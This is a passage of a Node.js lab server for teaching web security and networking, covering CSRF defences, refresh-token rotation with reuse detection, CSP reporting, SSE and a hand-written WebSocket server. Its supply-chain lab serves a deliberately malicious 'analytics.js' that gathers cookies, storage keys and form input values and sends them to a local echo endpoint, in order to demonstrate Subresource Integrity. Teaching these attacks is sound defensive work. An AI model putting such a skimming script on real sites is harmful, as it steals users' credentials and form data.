        `bank_session=user-alice; HttpOnly; Max-Age=3600; ${attrs}`,
        // The double-submit token is deliberately NOT HttpOnly: the page has to read it to send it.
        `bank_csrf=${token}; Max-Age=3600; ${attrs}`,
      ],
    });
  }

  if (action === 'logout') {
    return json(res, { ok: true }, 200, {
      'set-cookie': ['bank_session=; Path=/; Max-Age=0', 'bank_csrf=; Path=/; Max-Age=0'],
    });
  }

  if (action === 'config') {
    bank.defense = q.get('defense') || 'none';
    return json(res, { defense: bank.defense });
  }

  if (action === 'reset') {
    bank.balance = 1000; bank.ledger = [];
    return json(res, { ok: true, balance: bank.balance });
  }

  if (action === 'state') {
    return json(res, {
      balance: bank.balance, defense: bank.defense, ledger: bank.ledger.slice(-12),
      authenticated: Boolean(cookies.bank_session),
      cookieHeaderSeen: req.headers.cookie || null,
    }, 200, { 'cache-control': 'no-store' });
  }

  if (action === 'transfer') {
    const body = req.method === 'POST' ? await readBody(req) : '';
    const form = new URLSearchParams(body);
    const to = form.get('to') ?? q.get('to') ?? 'unknown';
    const amount = Number(form.get('amount') ?? q.get('amount') ?? 0);
    const sentToken = form.get('csrf') ?? q.get('csrf') ?? req.headers['x-csrf-token'] ?? null;
    const origin = req.headers.origin ?? (req.headers.referer ? new URL(req.headers.referer).origin : null);

    const deny = (why) => {
      bank.ledger.push({ at: new Date().toISOString().slice(11, 19), to, amount, result: `BLOCKED: ${why}` });
      return finish(403, `blocked — ${why}`);
    };
    const finish = (status, message) => {
      const wantsHtml = (req.headers.accept || '').includes('text/html');
      if (wantsHtml) {
        return send(res, status, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' },
          `<!doctype html><meta charset="utf-8"><link rel="stylesheet" href="/shared/lab.css">
           <body style="padding:14px"><p class="readout">${message}</p>
           <p class="hint">balance: ${bank.balance}</p></body>`);
      }
      return json(res, { ok: status === 200, message, balance: bank.balance }, status,
        { 'cache-control': 'no-store' });
    };

    // 1. Authentication. If the browser did not attach the cookie, the attack failed before it
    //    reached any application code — that is what SameSite does.
    if (!cookies.bank_session) return deny('no session cookie was sent with the request');

    // 2. The configured application-level defence.
    if (bank.defense === 'token' && (!sentToken || sentToken !== cookies.bank_csrf)) {
      return deny(sentToken ? 'CSRF token did not match' : 'no CSRF token in the request');
    }
    if (bank.defense === 'origin' && origin !== appOrigin) {
      return deny(`Origin/Referer was ${origin ?? '(absent)'}, expected ${appOrigin}`);
    }

    bank.balance -= amount;
    bank.ledger.push({ at: new Date().toISOString().slice(11, 19), to, amount, result: 'TRANSFERRED' });
    return finish(200, `transferred ${amount} to ${to}`);
  }

  return json(res, { error: 'unknown action' }, 400);
}

/**
 * /api/auth — a real-shaped token endpoint, for the auth lab.
 *
 * Short-lived signed access token + long-lived rotating refresh token in an HttpOnly cookie,
 * with refresh-token REUSE DETECTION. That last part is the bit most tutorials skip and the bit
 * that makes rotation worth doing.
 *
 *   ?action=login&ttl=10        issue an access token (seconds) + refresh cookie
 *   ?action=me                  requires Authorization: Bearer <token>
 *   ?action=refresh             rotates the refresh cookie, issues a new access token
 *   ?action=logout              revokes the family
 *   ?action=sessions            what the server knows (the thing the client cannot tell you)
 */
const AUTH_SECRET = crypto.randomBytes(32);
const refreshTokens = new Map();          // token -> { family, user, used, issuedAt }
const revokedFamilies = new Set();

const b64url = (buf) => Buffer.from(buf).toString('base64url');

function signJwt(payload, ttlSeconds) {
  const header = { alg: 'HS256', typ: 'JWT' };
  const body = { ...payload, iat: Math.floor(Date.now() / 1000), exp: Math.floor(Date.now() / 1000) + ttlSeconds };
  const data = `${b64url(JSON.stringify(header))}.${b64url(JSON.stringify(body))}`;
  const sig = crypto.createHmac('sha256', AUTH_SECRET).update(data).digest('base64url');
  return `${data}.${sig}`;
}

function verifyJwt(token) {
  const [h, p, s] = String(token).split('.');
  if (!h || !p || !s) return { ok: false, why: 'malformed token' };
  const expected = crypto.createHmac('sha256', AUTH_SECRET).update(`${h}.${p}`).digest('base64url');
  // timingSafeEqual on equal-length buffers: signature comparison must not leak by timing.
  const a = Buffer.from(s), b = Buffer.from(expected);
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) return { ok: false, why: 'bad signature' };
  const claims = JSON.parse(Buffer.from(p, 'base64url'));
  if (claims.exp * 1000 < Date.now()) return { ok: false, why: 'expired', claims };
  return { ok: true, claims };
}

function issueRefresh(family, user) {
  const token = crypto.randomBytes(24).toString('hex');
  refreshTokens.set(token, { family, user, used: false, issuedAt: Date.now() });
  return token;
}

function apiAuth(req, res, url) {
  const q = url.searchParams;
  const action = q.get('action') || 'me';
  const cookies = Object.fromEntries((req.headers.cookie || '').split(';')
    .map((c) => c.trim().split('=')).filter((p) => p[0]));
  const ttl = num(q, 'ttl', 10);
  const cookieAttrs = 'Path=/api/auth; HttpOnly; SameSite=Lax; Max-Age=3600';

  if (action === 'login') {
    const family = crypto.randomBytes(8).toString('hex');
    const refresh = issueRefresh(family, 'alice');
    return json(res, {
      accessToken: signJwt({ sub: 'alice', role: q.get('role') || 'user' }, ttl),
      expiresIn: ttl,
      note: 'the refresh token is in an HttpOnly cookie — document.cookie cannot see it',
    }, 200, { 'set-cookie': `refresh=${refresh}; ${cookieAttrs}` });
  }

  if (action === 'me') {
    const auth = req.headers.authorization || '';
    const token = auth.startsWith('Bearer ') ? auth.slice(7) : q.get('token');
    if (!token) return json(res, { error: 'no token' }, 401);
    const v = verifyJwt(token);
    if (!v.ok) return json(res, { error: v.why, claims: v.claims ?? null }, 401);
    return json(res, { user: v.claims.sub, role: v.claims.role, exp: v.claims.exp });
  }

  if (action === 'refresh') {
    const token = cookies.refresh;
    const entry = token && refreshTokens.get(token);
    if (!entry) return json(res, { error: 'no valid refresh token' }, 401);
    if (revokedFamilies.has(entry.family)) {
      return json(res, { error: 'this token family was revoked (reuse was detected earlier)' }, 401);
    }
    if (entry.used) {
      // REUSE DETECTION: a rotated token being presented twice means someone kept a copy.
      // The honest response is to assume theft and kill every session in the family.
      revokedFamilies.add(entry.family);
      return json(res, {
        error: 'refresh token reuse detected — the whole family is revoked',
        why: 'a rotated token can only be presented once. A second presentation means two parties hold it.',
      }, 401, { 'set-cookie': 'refresh=; Path=/api/auth; Max-Age=0' });
    }
    entry.used = true;
    const next = issueRefresh(entry.family, entry.user);
    return json(res, {
      accessToken: signJwt({ sub: entry.user, role: 'user' }, ttl),
      expiresIn: ttl, rotated: true,
    }, 200, { 'set-cookie': `refresh=${next}; ${cookieAttrs}` });
  }

  if (action === 'replay') {
    // The lab cannot resend a rotated cookie — the browser already replaced it. This stands in for
    // an attacker who kept a copy of a refresh token and presents it after the user has rotated.
    const spent = [...refreshTokens.entries()].filter(([, e]) => e.used).at(-1);
    if (!spent) return json(res, { error: 'nothing has been rotated yet — refresh once first' }, 400);
    const [token, entry] = spent;
    if (revokedFamilies.has(entry.family)) {
      return json(res, { error: 'family already revoked', family: entry.family }, 401);
    }
    revokedFamilies.add(entry.family);
    return json(res, {
      error: 'refresh token reuse detected — the whole family is revoked',
      replayed: `${token.slice(0, 8)}…`, family: entry.family,
      why: 'a rotated token is single-use. A second presentation means two parties hold it.',
    }, 401, { 'set-cookie': 'refresh=; Path=/api/auth; Max-Age=0' });
  }

  if (action === 'logout') {
    const entry = cookies.refresh && refreshTokens.get(cookies.refresh);
    if (entry) revokedFamilies.add(entry.family);
    return json(res, { ok: true }, 200, { 'set-cookie': 'refresh=; Path=/api/auth; Max-Age=0' });
  }

  if (action === 'sessions') {
    return json(res, {
      families: [...new Set([...refreshTokens.values()].map((e) => e.family))].map((f) => ({
        family: f, revoked: revokedFamilies.has(f),
        tokens: [...refreshTokens.values()].filter((e) => e.family === f).length,
      })),
    });
  }

  return json(res, { error: 'unknown action' }, 400);
}

/**
 * /api/thirdparty.js — a "vendor" script that changes under you, for the supply-chain lab.
 *
 *   ?v=1   the version you reviewed
 *   ?v=2   the same URL, after the vendor pushed an update nobody looked at
 *
 * Subresource Integrity exists precisely because ?v=1 and ?v=2 are the same URL.
 */
function apiThirdParty(req, res, url) {
  const v = url.searchParams.get('v') || '1';
  const benign = `
// analytics.js v1.0.0 — "just measures page views"
(function () {
  window.__vendor = { version: '1.0.0', pageviews: 1 };
  parent.postMessage({ vendor: '1.0.0', didExfiltrate: false }, '*');
})();`;
  const malicious = `
// analytics.js v1.0.1 — the same URL, one patch release later
(function () {
  window.__vendor = { version: '1.0.1', pageviews: 1 };
  // A third-party script runs with your origin's full authority. This is not an exploit;
  // it is the documented capability of a <script> tag.
  var loot = {
    cookies: document.cookie,
    storage: Object.keys(localStorage),
    forms: [].map.call(document.querySelectorAll('input'), function (i) { return i.name + '=' + i.value; }),
  };
  new Image().src = 'http://localhost:8081/api/echo?exfil=' + encodeURIComponent(JSON.stringify(loot).slice(0, 120));
  parent.postMessage({ vendor: '1.0.1', didExfiltrate: true, loot: loot }, '*');
})();`;
  const body = v === '2' ? malicious : benign;
  send(res, 200, {
    'content-type': 'text/javascript; charset=utf-8',
    'cache-control': 'no-store',
    'access-control-allow-origin': '*',
    // So the lab can show you the hash you would have pinned.
    'x-sri-sha384': `sha384-${crypto.createHash('sha384').update(body).digest('base64')}`,
    'access-control-expose-headers': 'x-sri-sha384',
  }, body);
}

/** Collects CSP violation reports so the lab can show what a report looks like. */
const cspReports = [];
function apiCspReport(req, res, url) {
  if (url.searchParams.has('list')) return json(res, { reports: cspReports.slice(-20) });
  if (url.searchParams.has('clear')) { cspReports.length = 0; return json(res, { ok: true }); }

  let body = '';
  req.on('data', (c) => { body += c; });
  req.on('end', () => {
    try { cspReports.push({ at: new Date().toISOString(), report: JSON.parse(body) }); }
    catch { cspReports.push({ at: new Date().toISOString(), raw: body.slice(0, 500) }); }
    bump('csp:report');
    send(res, 204, { 'access-control-allow-origin': '*', 'content-length': 0 });
  });
}

// ---------------------------------------------------------------------------
// Real-time: Server-Sent Events and a hand-rolled WebSocket
//
// Both are here because the realtime course is about the DIFFERENCES, and you cannot feel them
// from a description: SSE is one-way, text-only, auto-reconnecting and rides on plain HTTP;
// WebSocket is bidirectional, binary-capable, and hands you the reconnection problem.
// ---------------------------------------------------------------------------

const streamState = { seq: 0, clients: new Set() };

/**
 * /api/events — an SSE stream.
 *
 *   ?interval=1000    how often to send an event
 *   ?dropAfter=8      close the connection after N events (to exercise reconnection)
 *   ?flaky=1          fail the initial connection every other time
 *   Last-Event-ID     honoured: the browser sends it on reconnect, and we resume from it
 */
async function apiEvents(req, res, url) {
  const q = url.searchParams;
  const interval = num(q, 'interval', 1000);
  const dropAfter = num(q, 'dropAfter', 0);
  bump('sse:connect');

  if (bool(q, 'flaky') && bump('sse:flaky') % 2 === 0) {
    return send(res, 503, { 'content-type': 'text/plain' }, 'flaky: refusing this connection\n');
  }

  // The client tells us where it got to. This is the part people skip, and it is why their
  // reconnection loses messages.
  const lastId = Number(req.headers['last-event-id'] ?? q.get('lastEventId') ?? 0);

  res.writeHead(200, {
    'content-type': 'text/event-stream',
    'cache-control': 'no-store',
    connection: 'keep-alive',
    'x-accel-buffering': 'no',            // or a proxy will buffer your stream into uselessness
    'access-control-allow-origin': '*',
  });

  // `retry:` tells the browser how long to wait before reconnecting. It is a server-side
  // backoff control that most people never send.
  res.write(`retry: ${num(q, 'retry', 1000)}\n\n`);

  if (lastId && lastId < streamState.seq) {
    for (let id = lastId + 1; id <= streamState.seq; id++) {
      res.write(`id: ${id}\nevent: replay\ndata: ${JSON.stringify({ id, replayed: true })}\n\n`);
    }
  }

  let sent = 0;
  const timer = setInterval(() => {
    const id = ++streamState.seq;
    res.write(`id: ${id}\nevent: tick\ndata: ${JSON.stringify({ id, at: new Date().toISOString(), value: Math.round(Math.sin(id / 5) * 100) })}\n\n`);
    if (dropAfter && ++sent >= dropAfter) {
      clearInterval(timer);
      res.end();                          // the browser will reconnect on its own
    }
  }, interval);

  req.on('close', () => clearInterval(timer));
}

/**
 * A minimal WebSocket server, written out rather than imported, because the handshake and the
 * framing are the interesting part: an HTTP Upgrade, a SHA-1 of the client key plus a magic
 * GUID, and then length-prefixed, masked frames.
 */
const WS_GUID = '258EAFA5-E914-47DA-95CA-5AB0DC85B11F';
const wsClients = new Set();

function handleUpgrade(req, socket) {
  const key = req.headers['sec-websocket-key'];
  if (!key) return socket.destroy();
  const accept = crypto.createHash('sha1').update(key + WS_GUID).digest('base64');

  socket.write(
    'HTTP/1.1 101 Switching Protocols\r\n' +
    'Upgrade: websocket\r\n' +
    'Connection: Upgrade\r\n' +
    `Sec-WebSocket-Accept: ${accept}\r\n\r\n`,
  );
  bump('ws:connect');
  wsClients.add(socket);

  const url = new URL(req.url, `http://${req.headers.host}`);
  const dropAfter = num(url.searchParams, 'dropAfter', 0);
  let sent = 0;

  const timer = setInterval(() => {
    if (socket.destroyed) return clearInterval(timer);
    sendFrame(socket, JSON.stringify({ type: 'tick', id: ++streamState.seq, at: new Date().toISOString() }));
    if (dropAfter && ++sent >= dropAfter) {
      clearInterval(timer);
      socket.destroy();                   // an abrupt close: no close frame, like a dropped network
    }
  }, num(url.searchParams, 'interval', 1000));

  socket.on('data', (buf) => {
    const message = readFrame(buf);
    if (message == null) return;
    if (message === 'ping') return sendFrame(socket, JSON.stringify({ type: 'pong', at: Date.now() }));
    // Echo, and broadcast to everyone else — enough to demo collaboration.
    for (const client of wsClients) {
      if (client.destroyed) { wsClients.delete(client); continue; }
      sendFrame(client, JSON.stringify({ type: 'message', from: client === socket ? 'you' : 'peer', body: message }));
    }
  });

  socket.on('close', () => { clearInterval(timer); wsClients.delete(socket); });
  socket.on('error', () => { clearInterval(timer); wsClients.delete(socket); });
}

/** Server→client frames are never masked, and we only send text. */
function sendFrame(socket, text) {
  const payload = Buffer.from(text);
  const len = payload.length;
  let header;
  if (len < 126) {
    header = Buffer.from([0x81, len]);
  } else if (len < 65536) {
    header = Buffer.alloc(4);
    header[0] = 0x81; header[1] = 126; header.writeUInt16BE(len, 2);
  } else {
    header = Buffer.alloc(10);
    header[0] = 0x81; header[1] = 127; header.writeBigUInt64BE(BigInt(len), 2);
  }
  socket.write(Buffer.concat([header, payload]));
}

/** Client→server frames are always masked. Single-frame text messages only — enough for a lab. */
function readFrame(buf) {
  if (buf.length < 2) return null;
  const opcode = buf[0] & 0x0f;
  if (opcode === 0x8) return null;                       // close
  if (opcode !== 0x1) return null;                       // text only
  const masked = (buf[1] & 0x80) !== 0;
  let len = buf[1] & 0x7f;
  let offset = 2;
  if (len === 126) { len = buf.readUInt16BE(2); offset = 4; }
  else if (len === 127) { len = Number(buf.readBigUInt64BE(2)); offset = 10; }
  if (!masked) return buf.slice(offset, offset + len).toString();
  const mask = buf.slice(offset, offset + 4);
  const data = buf.slice(offset + 4, offset + 4 + len);
  const out = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) out[i] = data[i] ^ mask[i % 4];
  return out.toString();
}

// ---------------------------------------------------------------------------
// Introspection: did the request actually reach the server?
// ---------------------------------------------------------------------------

function apiStats(req, res) {
  json(res, {
    hits: Object.fromEntries([...hits].sort((a, b) => b[1] - a[1])),
    versions: Object.fromEntries([...versions].map(([k, v]) => [k, v])),
    recent: log.slice(-40),
  });
}

function apiReset(req, res) {
  hits.clear();
  versions.clear();
  log.length = 0;
  json(res, { ok: true, note: 'server counters cleared (the browser cache is untouched)' });
}

function apiBump(req, res, url) {
  const name = url.searchParams.get('name') || 'asset';
  const state = version(name);
  state.v++;
  state.mtime = new Date();
  json(res, { name, version: state.v, lastModified: state.mtime.toUTCString() });
}

function apiEcho(req, res, url) {
  if (req.method === 'OPTIONS') {
    return send(res, 204, { ...corsHeaders(url.searchParams, req, true), 'content-length': 0 });
  }
  json(res, {
    method: req.method,
    url: req.url,
    origin: req.headers.origin ?? null,
    headers: req.headers,
    receivedAt: new Date().toISOString(),
  }, 200, corsHeaders(url.searchParams, req, false));
}

// ---------------------------------------------------------------------------
// Static files
// ---------------------------------------------------------------------------

async function serveStatic(req, res, url) {
  let rel = decodeURIComponent(url.pathname);
  if (rel.endsWith('/')) rel += 'index.html';
  const abs = path.join(ROOT, path.normalize(rel));
  if (!abs.startsWith(ROOT)) return send(res, 403, { 'content-type': 'text/plain' }, 'nope');

  let stat;
  try {
    stat = await fsp.stat(abs);
  } catch {
    return send(res, 404, { 'content-type': 'text/plain; charset=utf-8' }, `404 ${rel}\n`);
  }

  if (stat.isDirectory()) {
    const idx = path.join(abs, 'index.html');
    if (fs.existsSync(idx)) return streamFile(req, res, idx, url);
    const entries = await fsp.readdir(abs, { withFileTypes: true });
    const items = entries
      .filter((e) => !e.name.startsWith('.'))
      .sort((a, b) => Number(b.isDirectory()) - Number(a.isDirectory()) || a.name.localeCompare(b.name))
      .map((e) => `<li><a href="${path.posix.join(rel, e.name)}${e.isDirectory() ? '/' : ''}">${e.name}${e.isDirectory() ? '/' : ''}</a></li>`)
      .join('\n');
    const body = `<!doctype html><meta charset="utf-8"><title>${rel}</title>
<style>body{background:#0d0d12;color:#e9e9f2;font:14px/1.7 ui-monospace,Menlo,monospace;padding:24px}
a{color:#7c9cff;text-decoration:none}a:hover{text-decoration:underline}ul{list-style:none;padding:0}</style>
<h1>${rel}</h1><ul>${items}</ul>`;
    return send(res, 200, { 'content-type': MIME['.html'], 'cache-control': 'no-store' }, body);
  }

  return streamFile(req, res, abs, url);
}

async function streamFile(req, res, abs, url) {
  // `?delay=` on ANY static file, so the asset labs can create controlled timing without
  // needing a synthetic endpoint. `?cc=` sets its caching.
  if (url.searchParams.has('delay')) await sleep(num(url.searchParams, 'delay'));
  return sendFile(req, res, abs, url);
}

function sendFile(req, res, abs, url) {
  const ext = path.extname(abs).toLowerCase();
  const headers = {
    'content-type': MIME[ext] || 'application/octet-stream',
    // Lab source files must never be cached, or you will spend an hour debugging
    // a fix you already made. The caching labs use /api/* for their cached assets.
    'cache-control': url.searchParams.get('cc') || 'no-store',
    'access-control-allow-origin': '*',
    'timing-allow-origin': '*',
    'cross-origin-resource-policy': 'cross-origin',
  };
  // `?csp=...` sets a Content-Security-Policy on any lab page, so the security course can try
  // policies against real pages without a build step.
  if (url.searchParams.has('csp')) {
    headers['content-security-policy'] = url.searchParams.get('csp');
  }
  if (url.searchParams.has('cspRO')) {
    headers['content-security-policy-report-only'] = url.searchParams.get('cspRO');
  }
  // `?isolate=1` turns on cross-origin isolation for that document, which is what
  // SharedArrayBuffer and high-resolution timers require. See web-workers lab 02.
  if (url.searchParams.has('isolate')) {
    headers['cross-origin-opener-policy'] = 'same-origin';
    headers['cross-origin-embedder-policy'] = 'require-corp';
  }
  // A service worker registered with a wider scope than its own directory needs this.
  if (ext === '.js' || ext === '.mjs') headers['service-worker-allowed'] = '/';
  res.writeHead(200, headers);
  if (req.method === 'HEAD') return res.end();
  fs.createReadStream(abs).pipe(res);
}

// ---------------------------------------------------------------------------
// The rendering sandbox — /render/<mode>/[product/<id>]
//
// One app, seven rendering strategies, identical markup. See shared/app/render.mjs.
// ---------------------------------------------------------------------------

async function renderSandbox(req, res, url) {
  const parts = url.pathname.split('/').filter(Boolean);       // ['render', mode, ...]
  const mode = parts[1];

  if (!mode) return json(res, { modes: MODES, usage: '/render/<mode>/ or /render/<mode>/product/<id>' });
  if (!MODES.includes(mode)) return json(res, { error: `unknown mode "${mode}"`, modes: MODES }, 404);

  const route = parts[2] === 'product' ? 'product' : 'listing';
  const id = route === 'product' ? (parts[3] || '1') : null;

  // Per-request latency overrides, so a lab can ask "what if reviews took 3 seconds?"
  for (const key of ['products', 'product', 'recommends', 'reviews']) {
    if (url.searchParams.has(`${key}Delay`)) {
      appData.latency[key] = num(url.searchParams, `${key}Delay`);
    }
  }

  bump(`render:${mode}:${route}`);
  return renderRoute({ mode, route, id, query: url.searchParams }, res);
}

/** The data API the CSR and RSC clients use. Same functions the server renderer calls. */
async function dataRoute(req, res, url) {
  const parts = url.pathname.split('/').filter(Boolean);      // ['api','data',name,id?]
  const name = parts[2];
  const id = parts[3] || '1';
  const delay = url.searchParams.has('delay') ? num(url.searchParams, 'delay') : undefined;
  bump(`data:${name}`);

  const opts = delay === undefined ? {} : { delay };
  const version = appData.version.n;

  switch (name) {
    case 'products': return json(res, { products: await appData.getProducts(opts), version });
    case 'product': return json(res, { product: await appData.getProduct(id, opts), version });
    case 'recommends': return json(res, { recommends: await appData.getRecommends(id, opts), version });
    case 'reviews': return json(res, { reviews: await appData.getReviews(id, opts), version });
    case 'calls': return json(res, { calls: appData.calls, latency: appData.latency });
    default: return json(res, { error: `unknown data source "${name}"` }, 404);
  }
}

/** Introspection + control for the rendering labs. */
function renderControl(req, res, url) {
  const q = url.searchParams;
  if (q.has('bumpVersion')) {
    const v = appData.bumpVersion();
    return json(res, { version: v, note: 'content changed — cached renders are now stale' });
  }
  if (q.has('invalidate')) {
    return json(res, { invalidated: invalidate(q.get('invalidate') === '1' ? '' : q.get('invalidate')) });
  }
  if (q.has('resetCalls')) { appData.resetCalls(); return json(res, { ok: true }); }
  if (q.has('latency')) {
    for (const [k, v] of Object.entries(JSON.parse(q.get('latency')))) appData.latency[k] = v;
    return json(res, { latency: appData.latency });
  }
  return json(res, {
    version: appData.version,
    latency: appData.latency,
    calls: appData.calls,
    cacheStats,
    cachedRoutes: [...routeCache.entries()].map(([key, v]) => ({
      key, ageSec: Math.round((Date.now() - v.renderedAt) / 1000), bytes: v.html.length,
    })),
  });
}

// ---------------------------------------------------------------------------
// Router
// ---------------------------------------------------------------------------

const ROUTES = {
  '/api/asset': apiAsset,
  '/api/cors': apiCors,
  '/api/echo': apiEcho,
  '/api/set-cookie': apiSetCookie,
  '/api/whoami': apiWhoami,
  '/api/script.js': (q, r, u) => apiSlow(q, r, u, 'js'),
  '/api/style.css': (q, r, u) => apiSlow(q, r, u, 'css'),
  '/api/image.svg': apiImage,
  '/api/font': apiFont,
  '/api/text': apiText,
  '/api/events': apiEvents,
  '/api/reflect': apiReflect,
  '/api/csp-report': apiCspReport,
  '/api/csp-page': apiCspPage,
  '/api/csrf': apiCsrf,
  '/api/auth': apiAuth,
  '/api/thirdparty.js': apiThirdParty,
  '/api/csp-probe.js': apiCspProbe,
  '/api/edge': apiEdge,
  '/api/rows': apiRows,
  '/api/blob': apiBlob,
  '/api/flaky': apiFlaky,
  '/api/redirect': apiRedirect,
  '/api/probe': apiProbe,
  '/api/render': renderControl,
  '/api/stats': apiStats,
  '/api/reset': apiReset,
  '/api/bump': apiBump,
};

async function handler(req, res) {
  const url = new URL(req.url, `http://${req.headers.host}`);
  log.push({ t: new Date().toISOString(), method: req.method, url: req.url, origin: req.headers.origin || null });
  if (log.length > 200) log.splice(0, log.length - 200);

  try {
    const route = ROUTES[url.pathname];
    if (route) return await route(req, res, url);
    if (url.pathname === '/render' || url.pathname.startsWith('/render/')) {
      return await renderSandbox(req, res, url);
    }
    if (url.pathname.startsWith('/api/data/')) return await dataRoute(req, res, url);
    if (req.method !== 'GET' && req.method !== 'HEAD') {
      return send(res, 405, { 'content-type': 'text/plain' }, 'method not allowed for static files\n');
    }
    return await serveStatic(req, res, url);
  } catch (err) {
    console.error(err);
    if (!res.headersSent) json(res, { error: String(err) }, 500);
    else res.end();
  }
}

for (const port of [APP_PORT, ALT_PORT]) {
  const server = http.createServer(handler);
  // The WebSocket lives on the same port: it starts as an HTTP request and is upgraded.
  server.on('upgrade', (req, socket) => handleUpgrade(req, socket));
  server.listen(port, () => {
    const role = port === APP_PORT ? 'app origin  ' : 'alt origin  ';
    console.log(`  ${role} http://localhost:${port}`);
  });
}
console.log('lab server up. ^C to stop.');
console.log(`  third origin http://127.0.0.1:${APP_PORT}  (same server, different host = different origin)`);
